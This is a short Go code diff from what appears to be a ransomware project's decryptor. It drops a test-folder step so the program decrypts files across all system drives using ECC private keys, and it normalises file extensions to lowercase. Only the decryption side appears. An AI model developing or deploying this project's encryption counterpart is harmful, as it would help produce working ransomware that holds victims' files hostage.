@@ -4,7 +4,6 @@ import (
 	"crypto/ecdsa"
 	"fmt"
 	"io/fs"
-	"os"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/eccLib"
@@ -28,10 +27,6 @@ func main() {
 	if privKeys, err = eccLib.ReadMultPrivKeys("keys.pem"); err != nil {
 		panic(err)
 	}
-
-	currentDirectory, _ := os.Getwd()
-	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-	decryptFiles([]string{dir}, privKeys)
 
 	drives := utils.GetDrives()
 	decryptFiles(drives, privKeys)
@@ -66,6 +61,7 @@ func decryptFiles(dirPaths []string, privKeys []*ecdsa.PrivateKey) {
 						split := strings.Split(path, ".")
 						if len(split) >= 2 {
 							ext = split[len(split)-2]
+							ext = strings.ToLower(ext)
 							filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
 						}
 					}
